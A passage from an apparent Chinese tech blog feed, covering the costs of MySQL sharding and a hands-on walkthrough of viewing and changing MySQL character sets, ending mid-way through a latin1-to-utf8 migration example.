&#x5728;&#x6267;&#x884C;&#x5206;&#x5E93;&#x5206;&#x8868;&#x4E4B;&#x540E;&#xFF0C;&#x7531;&#x4E8E;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x5230;&#x4E86;&#x4E0D;&#x540C;&#x7684;&#x5E93;&#x4E0A;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x51FA;&#x73B0;&#x4E86;&#x56F0;&#x96BE;&#x3002;&#x5982;&#x679C;&#x4F9D;&#x8D56;&#x6570;&#x636E;&#x5E93;&#x672C;&#x8EAB;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x529F;&#x80FD;&#x53BB;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#xFF0C;&#x5C06;&#x4ED8;&#x51FA;&#x9AD8;&#x6602;&#x7684;&#x6027;&#x80FD;&#x4EE3;&#x4EF7;&#xFF1B;&#x5982;&#x679C;&#x7531;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x53BB;&#x534F;&#x52A9;&#x63A7;&#x5236;&#xFF0C;&#x5F62;&#x6210;&#x7A0B;&#x5E8F;&#x903B;&#x8F91;&#x4E0A;&#x7684;&#x4E8B;&#x52A1;&#xFF0C;&#x53C8;&#x4F1A;&#x9020;&#x6210;&#x7F16;&#x7A0B;&#x65B9;&#x9762;&#x7684;&#x8D1F;&#x62C5;&#x3002;  </p><p>4.2 &#x8DE8;&#x5E93;&#x8DE8;&#x8868;&#x7684;join&#x95EE;&#x9898;&#x3002;<br>    &#x5728;&#x6267;&#x884C;&#x4E86;&#x5206;&#x5E93;&#x5206;&#x8868;&#x4E4B;&#x540E;&#xFF0C;&#x96BE;&#x4EE5;&#x907F;&#x514D;&#x4F1A;&#x5C06;&#x539F;&#x672C;&#x903B;&#x8F91;&#x5173;&#x8054;&#x6027;&#x5F88;&#x5F3A;&#x7684;&#x6570;&#x636E;&#x5212;&#x5206;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x8868;&#x3001;&#x4E0D;&#x540C;&#x7684;&#x5E93;&#x4E0A;&#xFF0C;&#x8FD9;&#x65F6;&#xFF0C;&#x8868;&#x7684;&#x5173;&#x8054;&#x64CD;&#x4F5C;&#x5C06;&#x53D7;&#x5230;&#x9650;&#x5236;&#xFF0C;&#x6211;&#x4EEC;&#x65E0;&#x6CD5;join&#x4F4D;&#x4E8E;&#x4E0D;&#x540C;&#x5206;&#x5E93;&#x7684;&#x8868;&#xFF0C;&#x4E5F;&#x65E0;&#x6CD5;join&#x5206;&#x8868;&#x7C92;&#x5EA6;&#x4E0D;&#x540C;&#x7684;&#x8868;&#xFF0C;&#x7ED3;&#x679C;&#x539F;&#x672C;&#x4E00;&#x6B21;&#x67E5;&#x8BE2;&#x80FD;&#x591F;&#x5B8C;&#x6210;&#x7684;&#x4E1A;&#x52A1;&#xFF0C;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x591A;&#x6B21;&#x67E5;&#x8BE2;&#x624D;&#x80FD;&#x5B8C;&#x6210;&#x3002;  </p><p>4.3 &#x989D;&#x5916;&#x7684;&#x6570;&#x636E;&#x7BA1;&#x7406;&#x8D1F;&#x62C5;&#x548C;&#x6570;&#x636E;&#x8FD0;&#x7B97;&#x538B;&#x529B;&#x3002;<br>     &#x989D;&#x5916;&#x7684;&#x6570;&#x636E;&#x7BA1;&#x7406;&#x8D1F;&#x62C5;&#xFF0C;&#x6700;&#x663E;&#x800C;&#x6613;&#x89C1;&#x7684;&#x5C31;&#x662F;&#x6570;&#x636E;&#x7684;&#x5B9A;&#x4F4D;&#x95EE;&#x9898;&#x548C;&#x6570;&#x636E;&#x7684;&#x589E;&#x5220;&#x6539;&#x67E5;&#x7684;&#x91CD;&#x590D;&#x6267;&#x884C;&#x95EE;&#x9898;&#xFF0C;&#x8FD9;&#x4E9B;&#x90FD;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x89E3;&#x51B3;&#xFF0C;&#x4F46;&#x5FC5;&#x7136;&#x5F15;&#x8D77;&#x989D;&#x5916;&#x7684;&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x8BB0;&#x5F55;&#x7528;&#x6237;&#x6210;&#x7EE9;&#x7684;&#x7528;&#x6237;&#x6570;&#x636E;&#x8868;userTable&#xFF0C;&#x4E1A;&#x52A1;&#x8981;&#x6C42;&#x67E5;&#x51FA;&#x6210;&#x7EE9;&#x6700;&#x597D;&#x7684;100&#x4F4D;&#xFF0C;&#x5728;&#x8FDB;&#x884C;&#x5206;&#x8868;&#x4E4B;&#x524D;&#xFF0C;&#x53EA;&#x9700;&#x4E00;&#x4E2A;order by&#x8BED;&#x53E5;&#x5C31;&#x53EF;&#x4EE5;&#x641E;&#x5B9A;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x8FDB;&#x884C;&#x5206;&#x8868;&#x4E4B;&#x540E;&#xFF0C;&#x5C06;&#x9700;&#x8981;n&#x4E2A;order by&#x8BED;&#x53E5;&#xFF0C;&#x5206;&#x522B;&#x67E5;&#x51FA;&#x6BCF;&#x4E00;&#x4E2A;&#x5206;&#x8868;&#x7684;&#x524D;100&#x540D;&#x7528;&#x6237;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5BF9;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#x8BA1;&#x7B97;&#xFF0C;&#x624D;&#x80FD;&#x5F97;&#x51FA;&#x7ED3;&#x679C;&#x3002;  </p><p>MySQL5.7 &#x5B98;&#x65B9;&#x6587;&#x6863;<br><a href="https://dev.mysql.com/doc/refman/5.7/en/" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;&amp;#x5B66;&amp;#x4E60;&amp;#x4E00;&amp;#x4E2A;&amp;#x670D;&amp;#x52A1;&amp;#x7684;&amp;#x8FC7;&amp;#x7A0B;&amp;#xFF1A;&quot;&gt;&lt;a href=&quot;#&amp;#x5B66;&amp;#x4E60;&amp;#x4E00;&amp;#x4E2A;&amp;#x670D;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL备份与恢复（删库不跑路）</title>
    <link href="https://marnm.github.io//posts/269a56e8/"/>
    <id>https://marnm.github.io//posts/269a56e8/</id>
    <published>2022-06-07T04:44:29.000Z</published>
    <updated>2022-06-07T05:13:38.103Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x4E00;&#xFF1A;MySQL&#x5B57;&#x7B26;&#x96C6;"><a href="#&#x4E00;&#xFF1A;MySQL&#x5B57;&#x7B26;&#x96C6;" class="headerlink" title="&#x4E00;&#xFF1A;MySQL&#x5B57;&#x7B26;&#x96C6;"></a>&#x4E00;&#xFF1A;MySQL&#x5B57;&#x7B26;&#x96C6;</h3><p><strong>1&#xFF1A;&#x5B57;&#x7B26;&#x96C6;&#x4ECB;&#x7ECD;</strong><br>&#x5B57;&#x7B26;&#x96C6;&#x5C31;&#x662F;&#x4E00;&#x5957;&#x6587;&#x5B57;&#x7B26;&#x53F7;&#x53CA;&#x5176;&#x7F16;&#x7801;&#x3001;&#x6BD4;&#x8F83;&#x89C4;&#x5219;&#x7684;&#x96C6;&#x5408;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x8BA1;&#x7B97;&#x673A;&#x5B57;&#x7B26;&#x96C6;ASC2&#xFF1B;MySQL&#x6570;&#x636E;&#x5E93;&#x5B57;&#x7B26;&#x96C6;&#x5305;&#x62EC;&#x5B57;&#x7B26;&#x96C6;&#xFF08;CHARACTER&#xFF09;&#x548C;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#xFF08;COLLATION&#xFF09;&#x4E24;&#x4E2A;&#x6982;&#x5FF5;&#xFF0C;&#x5176;&#x4E2D;&#x5B57;&#x7B26;&#x96C6;&#x7528;&#x6765;&#x5B9A;&#x4E49;MySQL&#x6570;&#x636E;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#xFF0C;&#x800C;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#x5B9A;&#x4E49;&#x6BD4;&#x8F83;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x65B9;&#x5F0F;</p><p><strong>2&#xFF1A;MySQL&#x6570;&#x636E;&#x5E93;&#x5E38;&#x89C1;&#x5B57;&#x7B26;&#x96C6;&#x4ECB;&#x7ECD;</strong></p><p>&#x9009;&#x62E9;&#x5B57;&#x7B26;&#x96C6;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;&#x56FD;&#x9645;&#x6807;&#x51C6;&#x7684;utf8</p><p><strong>3&#xFF1A;MySQL&#x600E;&#x6837;&#x9009;&#x62E9;&#x5408;&#x9002;&#x7684;&#x5B57;&#x7B26;&#x96C6;</strong><br>1&#x3001;&#x5982;&#x679C;&#x5904;&#x7406;&#x5404;&#x79CD;&#x5404;&#x6837;&#x7684;&#x6587;&#x5B57;&#xFF0C;&#x53D1;&#x5E03;&#x5230;&#x4E0D;&#x540C;&#x8BED;&#x8A00;&#x56FD;&#x5BB6;&#x5730;&#x533A;&#xFF0C;&#x5E94;&#x9009;Unicode&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x5BF9;MySQL&#x6765;&#x8BF4;&#x5C31;&#x662F;utf8(&#x6BCF;&#x4E2A;&#x6C49;&#x5B57;&#x4E09;&#x4E2A;&#x5B57;&#x8282;)<br>2&#x3001;&#x5982;&#x679C;&#x53EA;&#x662F;&#x9700;&#x8981;&#x652F;&#x6301;&#x4E2D;&#x6587;&#xFF0C;&#x5E76;&#x4E14;&#x6570;&#x636E;&#x91CF;&#x5F88;&#x5927;&#xFF0C;&#x6027;&#x80FD;&#x8981;&#x6C42;&#x4E5F;&#x9AD8;&#xFF0C;&#x53EF;&#x9009;GBK(&#x5B9A;&#x957F;&#xFF0C;&#x6BCF;&#x4E2A;&#x6C49;&#x5B57;&#x5360;&#x53CC;&#x5B57;&#x8282;&#xFF0C;&#x82F1;&#x6587;&#x4E5F;&#x5360;&#x53CC;&#x5B57;&#x8282;)&#xFF0C;&#x5982;&#x679C;&#x662F;&#x5927;&#x91CF;&#x8FD0;&#x7B97;&#xFF0C;&#x6BD4;&#x8F83;&#x6392;&#x5E8F;&#x7B49;&#xFF0C;&#x5B9A;&#x957F;&#x5B57;&#x7B26;&#x96C6;&#x66F4;&#x5FEB;&#xFF0C;&#x6027;&#x80FD;&#x4E5F;&#x9AD8;<br>3&#x3001;&#x5904;&#x7406;&#x79FB;&#x52A8;&#x4E92;&#x8054;&#x7F51;&#x4E1A;&#x52A1;&#xFF0C;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x4F7F;&#x7528;utf8mb4&#x5B57;&#x7B26;&#x96C6;</p><p><strong>4&#xFF1A;&#x67E5;&#x770B;&#x5F53;&#x524D;MySQL&#x652F;&#x6301;&#x7684;&#x5B57;&#x7B26;&#x96C6;</strong></p><p>MySQL&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x591A;&#x79CD;&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x540C;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5E93;&#x6216;&#x8868;&#x7684;&#x4E0D;&#x540C;&#x5B57;&#x6BB5;&#x90FD;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x4E0D;&#x540C;&#x7684;&#x5B57;&#x7B26;&#x96C6;</p><pre><code>mysql -uroot -pJaking@vip.163.com -e &quot;show character set \G;&quot;  #&#x67E5;&#x770B;&#x6240;&#x6709;&#x7684;&#x5B57;&#x7B26;&#x96C6;</code></pre><p>&#x67E5;&#x770B;&#x5E38;&#x7528;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#xFF1A;</p><pre><code>mysql -uroot -pJaking@vip.163.com -e &quot;show character set\G;&quot; |egrep &quot;gbk|utf8|latin1&quot;|awk &apos;{print $0}&apos;</code></pre><pre><code class="shell">[root@jaking ~]# mysql -uroot -pJaking@vip.163.com -e &quot;show character set\G;&quot; | egrep &quot;gbk|utf8|latin1&quot;|awk &apos;{print $0}&apos;mysql: [Warning] Using a password on the command line interface can be insecure.          Charset: latin1Default collation: latin1_swedish_ci          Charset: gbkDefault collation: gbk_chinese_ci          Charset: utf8Default collation: utf8_general_ci          Charset: utf8mb4Default collation: utf8mb4_general_ci</code></pre><p><strong>5&#xFF1A;&#x67E5;&#x770B;MySQL&#x5F53;&#x524D;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x8BBE;&#x7F6E;&#x60C5;&#x51B5;</strong></p><pre><code class="sql">mysql&gt; show variables like &apos;character_set%&apos;;+--------------------------+------------------------------------+| Variable_name            | Value                              |+--------------------------+------------------------------------+| character_set_client     | utf8                               || character_set_connection | utf8                               || character_set_database   | utf8                               || character_set_filesystem | binary                             || character_set_results    | utf8                               || character_set_server     | utf8                               || character_set_system     | utf8                               || character_sets_dir       | /usr/local/mysql57/share/charsets/ |+--------------------------+------------------------------------+8 rows in set (0.00 sec)mysql&gt; show character set;+----------+---------------------------------+---------------------+--------+| Charset  | Description                     | Default collation   | Maxlen |+----------+---------------------------------+---------------------+--------+| big5     | Big5 Traditional Chinese        | big5_chinese_ci     |      2 || dec8     | DEC West European               | dec8_swedish_ci     |      1 || cp850    | DOS West European               | cp850_general_ci    |      1 || hp8      | HP West European                | hp8_english_ci      |      1 || koi8r    | KOI8-R Relcom Russian           | koi8r_general_ci    |      1 || latin1   | cp1252 West European            | latin1_swedish_ci   |      1 || latin2   | ISO 8859-2 Central European     | latin2_general_ci   |      1 || swe7     | 7bit Swedish                    | swe7_swedish_ci     |      1 || ascii    | US ASCII                        | ascii_general_ci    |      1 || ujis     | EUC-JP Japanese                 | ujis_japanese_ci    |      3 || sjis     | Shift-JIS Japanese              | sjis_japanese_ci    |      2 || hebrew   | ISO 8859-8 Hebrew               | hebrew_general_ci   |      1 || tis620   | TIS620 Thai                     | tis620_thai_ci      |      1 || euckr    | EUC-KR Korean                   | euckr_korean_ci     |      2 || koi8u    | KOI8-U Ukrainian                | koi8u_general_ci    |      1 || gb2312   | GB2312 Simplified Chinese       | gb2312_chinese_ci   |      2 || greek    | ISO 8859-7 Greek                | greek_general_ci    |      1 || cp1250   | Windows Central European        | cp1250_general_ci   |      1 || gbk      | GBK Simplified Chinese          | gbk_chinese_ci      |      2 || latin5   | ISO 8859-9 Turkish              | latin5_turkish_ci   |      1 || armscii8 | ARMSCII-8 Armenian              | armscii8_general_ci |      1 || utf8     | UTF-8 Unicode                   | utf8_general_ci     |      3 || ucs2     | UCS-2 Unicode                   | ucs2_general_ci     |      2 || cp866    | DOS Russian                     | cp866_general_ci    |      1 || keybcs2  | DOS Kamenicky Czech-Slovak      | keybcs2_general_ci  |      1 || macce    | Mac Central European            | macce_general_ci    |      1 || macroman | Mac West European               | macroman_general_ci |      1 || cp852    | DOS Central European            | cp852_general_ci    |      1 || latin7   | ISO 8859-13 Baltic              | latin7_general_ci   |      1 || utf8mb4  | UTF-8 Unicode                   | utf8mb4_general_ci  |      4 || cp1251   | Windows Cyrillic                | cp1251_general_ci   |      1 || utf16    | UTF-16 Unicode                  | utf16_general_ci    |      4 || utf16le  | UTF-16LE Unicode                | utf16le_general_ci  |      4 || cp1256   | Windows Arabic                  | cp1256_general_ci   |      1 || cp1257   | Windows Baltic                  | cp1257_general_ci   |      1 || utf32    | UTF-32 Unicode                  | utf32_general_ci    |      4 || binary   | Binary pseudo charset           | binary              |      1 || geostd8  | GEOSTD8 Georgian                | geostd8_general_ci  |      1 || cp932    | SJIS for Windows Japanese       | cp932_japanese_ci   |      2 || eucjpms  | UJIS for Windows Japanese       | eucjpms_japanese_ci |      3 || gb18030  | China National Standard GB18030 | gb18030_chinese_ci  |      4 |+----------+---------------------------------+---------------------+--------+41 rows in set (0.00 sec)</code></pre><p><strong>&#x6539;&#x5B57;&#x7B26;&#x7F16;&#x7801;</strong></p><pre><code class="shell">[root@jaking ~]# echo character_set_server=utf8 &gt;&gt; /etc/my.cnf[root@jaking ~]# cat /etc/my.cnf[client]port=3306socket=/data/mysql/mysql.sock[mysqld]character-set-server=utf8collation-server=utf8_general_ciskip-name-resolveuser=mysqlport=3306basedir=/usr/local/mysql57datadir=/data/mysqltmpdir=/tmpsocket=/data/mysql/mysql.socklog-error=/data/mysql/mysqld.logpid-file=/data/mysql/mysqld.pid default-storage-engine=InnoDBcharacter_set_server=utf8[root@jaking ~]# systemctl restart mysqld[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 4Server version: 5.7.19 Source distributionCopyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</code></pre><pre><code class="sql">mysql&gt; show variables like &apos;character_set%&apos;;+--------------------------+------------------------------------+| Variable_name            | Value                              |+--------------------------+------------------------------------+| character_set_client     | utf8                               || character_set_connection | utf8                               || character_set_database   | utf8                               || character_set_filesystem | binary                             || character_set_results    | utf8                               || character_set_server     | utf8                               || character_set_system     | utf8                               || character_sets_dir       | /usr/local/mysql57/share/charsets/ |+--------------------------+------------------------------------+8 rows in set (0.00 sec)mysql&gt; create database testdb;     Query OK, 1 row affected (0.00 sec)mysql&gt; show create database testdb;+----------+-----------------------------------------------------------------+| Database | Create Database                                                 |+----------+-----------------------------------------------------------------+| testdb   | CREATE DATABASE `testdb` /*!40100 DEFAULT CHARACTER SET utf8 */ |+----------+-----------------------------------------------------------------+1 row in set (0.00 sec)</code></pre><p><strong>6&#xFF1A;&#x5B9E;&#x6218;&#xFF1A;&#x8FC1;&#x79FB;&#x6570;&#x636E;</strong></p><p> &#x80CC;&#x666F;&#xFF1A;&#x516C;&#x53F8;&#x4E1A;&#x52A1;&#x6570;&#x636E;book,&#x7531;&#x4E8E;&#x4E4B;&#x524D;&#x5EFA;&#x8868;&#x6CA1;&#x6CE8;&#x610F;&#x5B57;&#x7B26;&#x96C6;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5BFC;&#x81F4;&#x4E4B;&#x524D;&#x5199;&#x5165;&#x7684;&#x6570;&#x636E;&#x51FA;&#x73B0;&#x4E71;&#x7801;&#xFF1B;&#x73B0;&#x5728;&#x8981;&#x5C06;&#x4E4B;&#x524D;&#x7684;&#x6570;&#x636E;&#x548C;&#x73B0;&#x5728;&#x6570;&#x636E;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x4E00;&#x81F4;&#xFF0C;&#x4E0D;&#x51FA;&#x73B0;&#x4E71;&#x7801;&#x60C5;&#x51B5;&#xFF1B;&#x5C06;&#x5B57;&#x7B26;&#x96C6;&#x4E3A;latin1&#x5DF2;&#x6709;&#x8BB0;&#x5F55;&#x7684;&#x6570;&#x636E;&#x8F6C;&#x6210;utf8&#xFF0C;&#x5E76;&#x4E14;&#x5DF2;&#x7ECF;&#x5B58;&#x5728;&#x7684;&#x8BB0;&#x5F55;&#x4E0D;&#x4E71;&#x7801;</p><p>&#x6B65;&#x9AA4;<br>                 1&#xFF1A;&#x5EFA;&#x5E93;&#x53CA;&#x5EFA;&#x8868;&#x7684;&#x8BED;&#x53E5;&#x5BFC;&#x51FA;&#xFF0C;sed&#x6279;&#x91CF;&#x4FEE;&#x6539;&#x4E3A;utf8<br>                 2&#xFF1A;&#x5BFC;&#x51FA;&#x4E4B;&#x524D;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;<br>                 3&#xFF1A;&#x4FEE;&#x6539;mysql&#x670D;&#x52A1;&#x7AEF;&#x548C;&#x5BA2;&#x6237;&#x7AEF;&#x7F16;&#x7801;&#x4E3A;utf8<br>                 4&#xFF1A;&#x5220;&#x9664;&#x539F;&#x6709;&#x7684;&#x5E93;&#x8868;&#x53CA;&#x6570;&#x636E;<br>                 5&#xFF1A;&#x5BFC;&#x5165;&#x65B0;&#x7684;&#x5EFA;&#x5E93;&#x53CA;&#x5EFA;&#x8868;&#x8BED;&#x53E5;<br>                 6&#xFF1A;&#x5BFC;&#x5165;&#x4E4B;&#x524D;&#x7684;&#x6570;&#x636E;</p><p> &#x51C6;&#x5907;&#x521B;&#x5EFA;&#x6D4B;&#x8BD5;&#x5E93;&#x548C;&#x8868;&#x7684;SQL&#x8BED;&#x53E5;</p><pre><code class="sql">CREATE DATABASE testbookdb;#CREATE DATABASE `testbookdb` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;show databases;use testbookdb;CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16));INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;2&apos;,&apos;&#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;&apos;,&apos;68&apos;,&apos;&#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;3&apos;,&apos;&#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;&apos;,&apos;90&apos;,&apos;&#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;4&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;&apos;,&apos;71&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;5&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B;&apos;,&apos;72&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;6&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B;&apos;,&apos;73&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;7&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B;&apos;,&apos;74&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;8&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B;&apos;,&apos;75&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;9&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B;&apos;,&apos;76&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;10&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B;&apos;,&apos;77&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;11&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B;&apos;,&apos;78&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;12&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B;&apos;,&apos;79&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16));INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;Linux&apos;,&apos;66&apos;,&apos;DZ&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;2&apos;,&apos;CLD&apos;,&apos;68&apos;,&apos;RM&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;3&apos;,&apos;OS&apos;,&apos;90&apos;,&apos;JX&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;4&apos;,&apos;MySQL1&apos;,&apos;71&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;5&apos;,&apos;MySQL2&apos;,&apos;72&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;6&apos;,&apos;MySQL3&apos;,&apos;73&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;7&apos;,&apos;MySQL4&apos;,&apos;74&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;8&apos;,&apos;MySQL5&apos;,&apos;75&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;9&apos;,&apos;MySQL6&apos;,&apos;76&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;10&apos;,&apos;MySQL7&apos;,&apos;77&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;11&apos;,&apos;MySQL8&apos;,&apos;78&apos;,&apos;QH&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;12&apos;,&apos;MySQL9&apos;,&apos;79&apos;,&apos;QH&apos;);mysql&gt; create database book;Query OK, 1 row affected (0.00 sec)mysql&gt; show create database book;+----------+---------------------------------------------------------------+| Database | Create Database                                               |+----------+---------------------------------------------------------------+| book     | CREATE DATABASE `book` /*!40100 DEFAULT CHARACTER SET utf8 */ |+----------+---------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; use book;Database changedmysql&gt; CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16)) character set latin1;Query OK, 0 rows affected (0.00 sec)mysql&gt; show CREATE TABLE book1;+-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table                                                                                                                                                                                          |+-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book1 | CREATE TABLE `book1` (  `bTypeId` int(11) DEFAULT NULL,  `bName` char(16) DEFAULT NULL,  `price` int(11) DEFAULT NULL,  `publishing` char(16) DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=latin1 |+-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.02 sec)</code></pre><p><strong>&#x4FEE;&#x6539;&#x6570;&#x636E;&#x5E93;&#x5B57;&#x7B26;&#x96C6;</strong></p><pre><code class="sql">mysql&gt; show create database book;+----------+---------------------------------------------------------------+| Database | Create Database                                               |+----------+---------------------------------------------------------------+| book     | CREATE DATABASE `book` /*!40100 DEFAULT CHARACTER SET utf8 */ |+----------+---------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; alter database book default character set latin1;Query OK, 1 row affected (0.00 sec)mysql&gt; show create database book;+----------+-----------------------------------------------------------------+| Database | Create Database                                                 |+----------+-----------------------------------------------------------------+| book     | CREATE DATABASE `book` /*!40100 DEFAULT CHARACTER SET latin1 */ |+----------+-----------------------------------------------------------------+1 row in set (0.01 sec)</code></pre><p><strong>&#x4FEE;&#x6539;&#x8868;&#x7684;&#x5B57;&#x7B26;&#x96C6;</strong></p><pre><code class="sql">mysql&gt; show create table book1;+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table                                                                                                                                                                                        |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book1 | CREATE TABLE `book1` (  `bTypeId` int(11) DEFAULT NULL,  `bName` char(16) DEFAULT NULL,  `price` int(11) DEFAULT NULL,  `publishing` char(16) DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8 |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; alter table book1 default character set latin1;Query OK, 0 rows affected (0.00 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; show create table 